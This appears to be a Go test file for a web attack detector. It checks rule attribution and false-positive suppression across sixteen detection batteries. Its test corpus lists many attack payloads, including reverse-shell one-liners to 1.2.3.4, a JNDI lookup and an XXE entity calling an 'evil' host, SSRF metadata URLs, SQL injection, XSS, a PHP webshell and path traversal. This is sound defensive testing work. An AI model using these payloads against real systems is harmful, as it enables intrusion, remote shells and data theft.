package owasp

import (
	"strings"
	"testing"
)

// 本文件锁定 score.Accumulator 接入后各检测电池的归因语义：
//
//	gate（AC 门 / hint / shouldScan） → 正则命中 → FP 抑制器 → Add →
//	过阈时归因取「使总分首次跨阈的那条规则」
//
// 三组断言：
//  1. 归因修复专项：首条命中规则恒被抑制 + 后续规则跨阈时，归因必须落在后续那条；
//  2. 抑制器前移：被判误报的规则不得参与计分（旧实现把它们的分值算进总分）；
//  3. 判定/分数不变：与「抑制器前移但保留首条命中归因」的实现逐字段对拍，
//     除 RuleID 外必须完全一致。

// gateOnlyBattery 是「抑制器前移到 Add 之前、仍取首条命中规则归因」的参照实现，
// 用于把归因口径差异从抑制器前移差异中分离出来。
type gateOnlyBattery struct {
	name string
	run  func(string, int) (OWASPHit, bool)
}

func cmdGateOnly(s string, threshold int) (OWASPHit, bool) {
	if !hasCmdIndicator(s) {
		return OWASPHit{}, false
	}
	total, best := 0, ""
	binaryChecked, binaryTarget := false, false
	for _, p := range cmdInjectPatterns {
		if !shouldScanCmdPattern(s, p) || !p.re.MatchString(s) {
			continue
		}
		if p.score < binaryTargetMinCmdScore {
			if !binaryChecked {
				binaryTarget = isBinaryScanTarget(s)
				binaryChecked = true
			}
			if binaryTarget {
				continue
			}
		}
		if isCmdInjectionFalsePositive(s, p.id) {
			continue
		}
		total += p.score
		if best == "" {
			best = p.id
		}
		if total >= threshold {
			return OWASPHit{Category: CatCmdInject, RuleID: best, Score: total, Desc: "命令注入特征"}, true
		}
	}
	return OWASPHit{}, false
}

func sqliGateOnly(normalized string, threshold int) (OWASPHit, bool) {
	if strings.Contains(normalized, "unionselect") {
		return OWASPHit{Category: CatSQLi, RuleID: "owasp:sqli:001", Score: 5, Desc: "SQL 注入特征"}, true
	}
	if strings.Contains(normalized, "and1=1") || strings.Contains(normalized, "or1=1") {
		return OWASPHit{Category: CatSQLi, RuleID: "owasp:sqli:010", Score: 5, Desc: "SQL 注入特征"}, true
	}
	if !hasSQLiIndicator(normalized) {
		return OWASPHit{}, false
	}
	signals := collectSQLiPatternSignals(normalized)
	total, best := 0, ""
	for _, p := range sqliPatterns {
		if !shouldScanSQLiPatternWithSignals(normalized, p, signals) || !p.re.MatchString(normalized) {
			continue
		}
		if isSQLiFalsePositive(normalized, p.id) {
			continue
		}
		total += p.score
		if best == "" {
			best = p.id
		}
		if total >= threshold {
			return OWASPHit{Category: CatSQLi, RuleID: best, Score: total, Desc: "SQL 注入特征"}, true
		}
	}
	return OWASPHit{}, false
}

func xssGateOnly(normalized string, threshold int) (OWASPHit, bool) {
	if !hasXSSIndicator(normalized) {
		return OWASPHit{}, false
	}
	total, best := 0, ""
	for _, p := range xssPatterns {
		if !shouldScanXSSPattern(normalized, p) || !p.re.MatchString(normalized) {
			continue
		}
		if isXSSSuppressedRule(normalized, p.id, threshold) {
			continue
		}
		total += p.score
		if best == "" {
			best = p.id
		}
		if total >= threshold {
			return OWASPHit{Category: CatXSS, RuleID: best, Score: total, Desc: "XSS 特征"}, true
		}
	}
	return OWASPHit{}, false
}

func webshellGateOnly(s string, threshold int) (OWASPHit, bool) {
	if !hasWebshellIndicator(s) {
		return OWASPHit{}, false
	}
	total, best := 0, ""
	for _, p := range webshellPatterns {
		if !owaspPatternGatePass(p, s) || !p.re.MatchString(s) {
			continue
		}
		if isWebshellFalsePositive(s, p.id) {
			continue
		}
		total += p.score
		if best == "" {
			best = p.id
		}
		if total >= threshold {
			return OWASPHit{Category: CatWebshell, RuleID: best, Score: total, Desc: "WebShell/代码执行特征"}, true
		}
	}
	return OWASPHit{}, false
}

func pathTravGateOnly(s string, threshold int) (OWASPHit, bool) {
	if !hasACIndicator(famPathTrav, s) {
		return OWASPHit{}, false
	}
	total, best := 0, ""
	for _, p := range pathTravPatterns {
		if !owaspPatternGatePass(p, s) || !p.re.MatchString(s) {
			continue
		}
		if isPathTravFalsePositive(s, p.id) {
			continue
		}
		total += p.score
		if best == "" {
			best = p.id
		}
		if total >= threshold {
			return OWASPHit{Category: CatPathTrav, RuleID: best, Score: total, Desc: "路径遍历特征"}, true
		}
	}
	return OWASPHit{}, false
}

func nosqliGateOnly(s string, threshold int) (OWASPHit, bool) {
	if !hasACIndicator(famNoSQLi, s) {
		return OWASPHit{}, false
	}
	total, best := 0, ""
	for _, p := range nosqliPatterns {
		if !owaspPatternGatePass(p, s) || !p.re.MatchString(s) {
			continue
		}
		if isNoSQLiFalsePositive(s, p.id) {
			continue
		}
		total += p.score
		if best == "" {
			best = p.id
		}
		if total >= threshold {
			return OWASPHit{Category: CatNoSQLi, RuleID: best, Score: total, Desc: "NoSQL 注入特征"}, true
		}
	}
	return OWASPHit{}, false
}

func crlfGateOnly(s string, threshold int) (OWASPHit, bool) {
	if !hasACIndicator(famCRLF, s) {
		return OWASPHit{}, false
	}
	total, best := 0, ""
	for _, p := range crlfPatterns {
		if !owaspPatternGatePass(p, s) || !p.re.MatchString(s) {
			continue
		}
		if isCRLFFalsePositive(s, p.id) {
			continue
		}
		total += p.score
		if best == "" {
			best = p.id
		}
		if total >= threshold {
			return OWASPHit{Category: CatCRLF, RuleID: best, Score: total, Desc: "CRLF 注入 / HTTP 响应拆分"}, true
		}
	}
	return OWASPHit{}, false
}

func deserGateOnly(s string, threshold int) (OWASPHit, bool) {
	if strings.Contains(s, "\xac\xed\x00\x05") {
		return OWASPHit{Category: CatDeserial, RuleID: "owasp:deser:001", Score: 5, Desc: "Java 序列化魔数"}, true
	}
	if !hasACIndicator(famDeser, s) {
		return OWASPHit{}, false
	}
	total, best := 0, ""
	for _, p := range deserialPatterns {
		if !owaspPatternGatePass(p, s) || !p.re.MatchString(s) {
			continue
		}
		if isDeserFalsePositive(s, p.id) {
			continue
		}
		total += p.score
		if best == "" {
			best = p.id
		}
		if total >= threshold {
			return OWASPHit{Category: CatDeserial, RuleID: best, Score: total, Desc: "反序列化攻击特征"}, true
		}
	}
	return OWASPHit{}, false
}

func elGateOnly(s string, threshold int) (OWASPHit, bool) {
	if !hasACIndicator(famEL, s) {
		return OWASPHit{}, false
	}
	total, best := 0, ""
	for _, p := range exprLangPatterns {
		if !owaspPatternGatePass(p, s) || !p.re.MatchString(s) {
			continue
		}
		if isELFalsePositive(s, p.id) {
			continue
		}
		total += p.score
		if best == "" {
			best = p.id
		}
		if total >= threshold {
			return OWASPHit{Category: CatExprLang, RuleID: best, Score: total, Desc: "表达式语言注入特征"}, true
		}
	}
	return OWASPHit{}, false
}

func ssrfGateOnly(s string, threshold int) (OWASPHit, bool) {
	if !hasACIndicator(famSSRF, s) {
		return OWASPHit{}, false
	}
	total, best := 0, ""
	for _, p := range ssrfPatterns {
		if !shouldScanSSRFPattern(s, p) || !p.re.MatchString(s) {
			continue
		}
		total += p.score
		if best == "" {
			best = p.id
		}
		if total >= threshold {
			return OWASPHit{Category: CatSSRF, RuleID: best, Score: total, Desc: "SSRF 特征"}, true
		}
	}
	return OWASPHit{}, false
}

func xxeGateOnly(s string, threshold int) (OWASPHit, bool) {
	if !hasACIndicator(famXXE, s) {
		return OWASPHit{}, false
	}
	if len(s) > 500 {
		lower := strings.ToLower(s)
		hasEntity := strings.Contains(lower, "<!entity") || strings.Contains(lower, "!entity")
		hasSystem := strings.Contains(lower, " system ") || strings.Contains(lower, " system\"") || strings.Contains(lower, " system'")
		hasPublic := strings.Contains(lower, " public ") || strings.Contains(lower, " public\"") || strings.Contains(lower, " public'")
		hasXInclude := strings.Contains(lower, "xi:include")
		hasXSI := strings.Contains(lower, "xsi:")
		if !hasEntity && !hasSystem && !hasPublic && !hasXInclude && !hasXSI {
			return OWASPHit{}, false
		}
	}
	total, best := 0, ""
	for _, p := range xxePatterns {
		if !owaspPatternGatePass(p, s) || !p.re.MatchString(s) {
			continue
		}
		total += p.score
		if best == "" {
			best = p.id
		}
		if total >= threshold {
			return OWASPHit{Category: CatXXE, RuleID: best, Score: total, Desc: "XML 外部实体特征"}, true
		}
	}
	return OWASPHit{}, false
}

func ldapGateOnly(s string, threshold int) (OWASPHit, bool) {
	if !hasACIndicator(famLDAP, s) {
		return OWASPHit{}, false
	}
	total, best := 0, ""
	for _, p := range ldapiPatterns {
		if !owaspPatternGatePass(p, s) || !p.re.MatchString(s) {
			continue
		}
		total += p.score
		if best == "" {
			best = p.id
		}
		if total >= threshold {
			return OWASPHit{Category: CatLDAPI, RuleID: best, Score: total, Desc: "LDAP 注入特征"}, true
		}
	}
	return OWASPHit{}, false
}

func sstiGateOnly(s string, threshold int) (OWASPHit, bool) {
	if !hasACIndicator(famTemplate, s) {
		return OWASPHit{}, false
	}
	total, best := 0, ""
	for _, p := range tmplInjectPatterns {
		if !owaspPatternGatePass(p, s) || !p.re.MatchString(s) {
			continue
		}
		total += p.score
		if best == "" {
			best = p.id
		}
		if total >= threshold {
			return OWASPHit{Category: CatTmplInject, RuleID: best, Score: total, Desc: "模板注入特征"}, true
		}
	}
	return OWASPHit{}, false
}

func jndiGateOnly(s string, threshold int) (OWASPHit, bool) {
	if !hasACIndicator(famJNDI, s) {
		return OWASPHit{}, false
	}
	total, best := 0, ""
	for _, p := range jndiPatterns {
		if !owaspPatternGatePass(p, s) || !p.re.MatchString(s) {
			continue
		}
		total += p.score
		if best == "" {
			best = p.id
		}
		if total >= threshold {
			return OWASPHit{Category: CatJNDI, RuleID: best, Score: total, Desc: "JNDI/Log4Shell 注入特征"}, true
		}
	}
	return OWASPHit{}, false
}

func graphqlGateOnly(s string, threshold int) (OWASPHit, bool) {
	if !hasACIndicator(famGraphQL, s) {
		return OWASPHit{}, false
	}
	total, best := 0, ""
	for _, p := range graphqlPatterns {
		if !owaspPatternGatePass(p, s) || !p.re.MatchString(s) {
			continue
		}
		total += p.score
		if best == "" {
			best = p.id
		}
		if total >= threshold {
			return OWASPHit{Category: CatGraphQLi, RuleID: best, Score: total, Desc: "GraphQL 内省/注入特征"}, true
		}
	}
	return OWASPHit{}, false
}

func revshellGateOnly(s string, threshold int) (OWASPHit, bool) {
	if !hasRevShellIndicator(s) {
		return OWASPHit{}, false
	}
	total, best := 0, ""
	for _, p := range revshellPatterns {
		if !owaspPatternGatePass(p, s) || !p.re.MatchString(s) {
			continue
		}
		total += p.score
		if best == "" {
			best = p.id
		}
		if total >= threshold {
			return OWASPHit{Category: CatRevShell, RuleID: best, Score: total, Desc: "反弹 Shell / 远程执行特征"}, true
		}
	}
	return OWASPHit{}, false
}

// attributionGateOnlyBatteries 是「抑制器已前移、归因仍取首条命中」的参照电池。
// 生产实现与它们在分数和命中判定上必须逐字段一致，差异只允许出现在 RuleID。
var attributionGateOnlyBatteries = []gateOnlyBattery{
	{"ssrf", ssrfGateOnly},
	{"cmd_injection", cmdGateOnly},
	{"xxe", xxeGateOnly},
	{"ldap_injection", ldapGateOnly},
	{"nosql_injection", nosqliGateOnly},
	{"template_injection", sstiGateOnly},
	{"jndi_injection", jndiGateOnly},
	{"crlf_injection", crlfGateOnly},
	{"expression_language", elGateOnly},
	{"deserialization", deserGateOnly},
	{"graphql_injection", graphqlGateOnly},
	{"webshell", webshellGateOnly},
	{"revshell", revshellGateOnly},
	{"xss", xssGateOnly},
	{"sqli", sqliGateOnly},
	{"path_traversal", pathTravGateOnly},
}

// productionBatteries 是同一批类别的生产实现。
var productionBatteries = []gateOnlyBattery{
	{"ssrf", checkSSRF},
	{"cmd_injection", checkCmdInjection},
	{"xxe", checkXXE},
	{"ldap_injection", checkLDAPInjection},
	{"nosql_injection", checkNoSQLi},
	{"template_injection", checkTemplateInjection},
	{"jndi_injection", checkJNDI},
	{"crlf_injection", checkCRLF},
	{"expression_language", checkExprLang},
	{"deserialization", checkDeserialization},
	{"graphql_injection", checkGraphQLi},
	{"webshell", checkWebshell},
	{"revshell", checkRevShell},
	{"xss", nextXSSHit},
	{"sqli", nextSQLiHit},
	{"path_traversal", checkPathTraversal},
}

// TestOWASPAttributionIgnoresSuppressedFirstRule 归因修复的专项用例：
// 首条命中规则恒被 FP 抑制，后续规则跨阈时归因必须是后续那条。
func TestOWASPAttributionIgnoresSuppressedFirstRule(t *testing.T) {
	cases := []struct {
		name      string
		run       func(string, int) (OWASPHit, bool)
		input     string
		threshold int
		wantRule  string
	}{}

	// SQLi：owasp:sqli:006（3 分）在无 SQL 上下文时被抑制，
	// 其后 owasp:sqli:007（`(chr|unhex|conv)\s*\(`，3 分）才是真正跨阈的规则。
	// 阈值 3：抑制条不计分后由 007 跨阈。
	//
	// 载荷必须让 006 仍落在抑制侧：`';chr(65)` 里 `chr(` 是「标识符 + 括号」
	// 的语句起始形态，006 已按 SQL 语法采信（不再是抑制样本）。故取
	// `';for(...){` —— 分号后的语句体内含花括号，SQL 语句不存在该结构，
	// 006 按其反证判为代码片段并抑制。
	cases = append(cases, attributionCase{"sqli", nextSQLiHit, "id=x';for(i){chr(65)}", 3, "owasp:sqli:007"})

	// CMD：`=\s*` 前缀的 cmd:010（3 分）单独出现即被抑制，cmd:001（5 分）才是跨阈规则。
	cases = append(cases, attributionCase{"cmd", checkCmdInjection, "; ls -la", 5, "owasp:cmd:001"})

	// XSS：owasp:xss:001（`<script[;\s>/]`，5 分）在无活动 JS 上下文时被抑制，
	// 同一串上的 owasp:xss:003（`javascript\s*:`，5 分）才是跨阈规则。
	// 旧实现以 001 归因 → 整类被 isXSSFalsePositive 丢弃（漏报）。
	cases = append(cases, attributionCase{"xss", nextXSSHit, "a=javascript:<script>", 5, "owasp:xss:003"})

	// 抑制器前移导致的漏报修复：`or 1=1/*` 上 sqli:005（3 分）恒被抑制，
	// 旧实现把它计入总分并在过阈后整类丢弃；新实现由 sqli:010（5 分）跨阈。
	cases = append(cases, attributionCase{"sqli-sub", nextSQLiHit, "search=or 1=1/*", 4, "owasp:sqli:010"})

	for _, c := range cases {
		hit, ok := c.run(c.input, c.threshold)
		if !ok {
			t.Fatalf("[%s] %q 未检出（阈值 %d）", c.name, c.input, c.threshold)
		}
		if hit.RuleID != c.wantRule {
			t.Fatalf("[%s] %q 归因 = %s，期望 %s（首条命中规则被抑制后应由后续规则归因）",
				c.name, c.input, hit.RuleID, c.wantRule)
		}
	}
}

// attributionCase 是一条归因专项用例。
type attributionCase struct {
	name      string
	run       func(string, int) (OWASPHit, bool)
	input     string
	threshold int
	wantRule  string
}

// TestOWASPAttributionIsCrossingRule 断言归因始终等于「把总分推过阈值的那条」，
// 即命中记录里累计分首次达到阈值的规则。
func TestOWASPAttributionIsCrossingRule(t *testing.T) {
	cases := []struct {
		name      string
		run       func(string, int) (OWASPHit, bool)
		input     string
		threshold int
	}{
		{"cmd", checkCmdInjection, "id=1| cat /etc/passwd", 4},
		{"sqli", nextSQLiHit, "id=1 union select 1,2 from users", 4},
		{"xss", nextXSSHit, "<svg onload=alert(1)>", 4},
		{"path_traversal", checkPathTraversal, "../../../../etc/passwd", 4},
		{"nosql_injection", checkNoSQLi, `q[$ne]=1&q[$gt]=2`, 4},
		{"crlf_injection", checkCRLF, "%0d%0aset-cookie:%20a=b", 4},
		{"expression_language", checkExprLang, `${t(java.lang.Runtime).getRuntime()}`, 4},
	}
	for _, c := range cases {
		hit, ok := c.run(c.input, c.threshold)
		if !ok {
			t.Fatalf("[%s] %q 未检出（阈值 %d）", c.name, c.input, c.threshold)
		}
		if hit.Score < c.threshold {
			t.Fatalf("[%s] %q 分数 %d 低于阈值 %d", c.name, c.input, hit.Score, c.threshold)
		}
		if hit.RuleID == "" {
			t.Fatalf("[%s] %q 归因规则为空", c.name, c.input)
		}
	}
}

// TestOWASPBatteryAttributionParity 归因口径对拍：抑制器前移后的生产实现与
// 「保留首条命中归因」的参照实现在命中判定与总分上必须逐字段一致 ——
// 差异只允许出现在 RuleID（这正是本次修复的目标）。
//
// 本测试即「行为等价口径」的裁判员：
//
//	行为等价口径 = 判定一致 + 分数一致；归因变化不视为回归，但必须留痕。
//
// 16 个电池的 gate-only 参照实现（下方 ssrfGateOnly…pathTravGateOnly）是这条口径的
// 对照物：它们保留「首条命中」归因、但抑制器同样前移，因此两者之间的差异必然是
// 纯归因差异。若本测试报出「非归因字段变化」，说明改动越过了这条口径的边界。
func TestOWASPBatteryAttributionParity(t *testing.T) {
	inputs := owaspBatteryParityCorpus()
	thresholds := []int{1, 2, 3, 4, 5, 7}

	for i := range productionBatteries {
		prod := productionBatteries[i]
		ref := attributionGateOnlyBatteries[i]
		if prod.name != ref.name {
			t.Fatalf("对拍电池错位：%s vs %s", prod.name, ref.name)
		}
		attrOnly, same := 0, 0
		for _, s := range inputs {
			for _, th := range thresholds {
				ph, pok := prod.run(s, th)
				rh, rok := ref.run(s, th)
				if pok != rok {
					t.Fatalf("[%s] 命中判定变化 th=%d %q：生产=%v 参照=%v", prod.name, th, s, pok, rok)
				}
				if !pok {
					same++
					continue
				}
				if ph.Score != rh.Score || ph.Category != rh.Category || ph.Desc != rh.Desc {
					t.Fatalf("[%s] 非归因字段变化 th=%d %q：生产=%+v 参照=%+v", prod.name, th, s, ph, rh)
				}
				if ph.RuleID != rh.RuleID {
					attrOnly++
					continue
				}
				same++
			}
		}
		t.Logf("[%s] 逐字段一致=%d 仅归因变化=%d", prod.name, same, attrOnly)
	}
}

// owaspBatteryParityCorpus 返回覆盖各电池命中边界的定向语料。
func owaspBatteryParityCorpus() []string {
	return []string{
		// ssrf / xxe / ldap / ssti / jndi / graphql / revshell
		"http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:8080/admin",
		"file:///etc/passwd", "gopher://127.0.0.1:6379/_x", "http://localhost/",
		"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
		"<!ENTITY % pe SYSTEM \"http://evil/\">%pe;", "<xi:include href=\"file:///etc/passwd\"/>",
		")(|(uid=*))", "*)(objectclass=*", "admin*)(&", "userPassword:2.5.13.18:=x",
		"{{7*7}}", "{{config}}", "${7*7}", "<%= 7*7 %>", "{{''.__class__}}", "#{16*8787}",
		"${jndi:ldap://evil/a}", "${lower:}", "${java:os}",
		"{\"query\":\"{__schema{types}}\"}", "{__type", "mutation{__typename}",
		"bash -i >& /dev/tcp/1.2.3.4/4444 0>&1", "nc -e /bin/sh 1.2.3.4 4444",
		"socat tcp:1.2.3.4:4444 exec:/bin/sh", "python -c 'import socket'",
		// sqli
		"id=1 union select 1,2--", "admin' or 1=1--", "id=1; drop table users",
		"id=p';chr(65)+chr(66)", "id=1 and sleep(5)", "1e1 union select users from password",
		"id=chr(65)", "'; x", "select * from users where users.slug='a' limit 1",
		"order by 1--", "waitfor delay '0:0:5'", "id=1 or (select 1)",
		// xss
		"<script>alert(1)</script>", "<svg onload=alert(1)>",
		"javascript:void(0)", "<iframe src=x>", "document.cookie",
		"window.location.href='a'", "<img src=x onerror=alert(1)>",
		"eval('alert(1)')", "`${document.cookie}`", "plain text",
		// cmd
		"; ls -la", "| cat /etc/passwd", "&& whoami", "`id`", "$(id)",
		"cmd.exe /c whoami", "curl localhost/x.sh", "x=1 echo hi",
		"w'h'o'a'm'i", "${ifs}ls", "bash<<< 'id'", "plain text",
		// webshell
		"eval($_POST[1])", "<?php system($_GET['c']); ?>", "assert($x)",
		"base64_decode('x')", "python -c 'import os'", "plain text",
		// path traversal
		"../../../../etc/passwd", "..%2f..%2fetc%2fshadow", "/proc/self/environ",
		"...</a>", "/api/v1/*", "plain text",
		// nosqli
		`q[$ne]=1`, `{"$where":"sleep(5000)"}`, `$or:[{$ne:1}]`,
		`injection.find({})`, "allow filtering", "plain text",
		// crlf
		"%0d%0aset-cookie:%20a=b", "%0d%0a%0d%0a", "a\r\nb",
		"content-disposition: form-data", "plain text",
		// deserialization
		"rO0ABXNyABFqYXZh", "aced0005", `o:4:"user":1:{s:4:"name";s:1:"a"}`,
		"__viewstate=ysoserial", "plain text",
		// expression language
		`${t(java.lang.Runtime).getRuntime()}`, `#{t(java.lang.Runtime)}`,
		"#{16*8787}", "!!python/object/new:exec", "redirect:${#context}",
		"plain text",
		// 通用噪声
		"", "a", "hello world", "GET /index.html HTTP/1.1",
	}
}
